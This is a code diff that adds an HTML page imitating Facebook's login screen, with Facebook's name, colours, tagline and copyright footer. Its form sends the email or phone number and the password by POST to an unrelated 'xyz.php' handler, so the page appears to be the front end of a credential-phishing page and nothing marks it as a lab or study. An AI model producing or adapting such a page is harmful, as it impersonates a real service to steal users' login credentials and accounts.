@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            display: flex;
+            flex-direction: row;
+            align-items: center;
+        }
+        .left {
+            margin-right: 50px;
+        }
+        .left h1 {
+            color: #1877f2;
+            font-size: 48px;
+            margin: 0;
+        }
+        .left p {
+            font-size: 24px;
+            margin: 10px 0 0;
+        }
+        .right {
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            width: 300px;
+        }
+        .right input[type="text"],
+        .right input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+        }
+        .right input[type="submit"] {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .right a {
+            display: block;
+            text-align: center;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .right hr {
+            margin: 20px 0;
+            border: none;
+            border-top: 1px solid #dddfe2;
+        }
+        .right button {
+            width: 100%;
+            padding: 14px;
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .footer {
+            margin-top: 50px;
+            text-align: center;
+            color: #8a8d91;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="left">
+            <h1>facebook</h1>
+            <p>Connect with friends and the world around you on Facebook.</p>
+        </div>
+        <div class="right">
+            <form action="xyz.php" method="POST">
+                <input type="text" name="email" placeholder="Email or Phone Number" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <input type="submit" value="Log In">
+                <a href="#">Forgotten password?</a>
+                <hr>
+                <button type="button" onclick="window.location.href='https://www.example.com/signup';">Create New Account</button>
+            </form>
+        </div>
+    </div>
+    <div class="footer">
+        <p>&copy; 2024 Facebook</p>
+    </div>
+</body>
+</html>
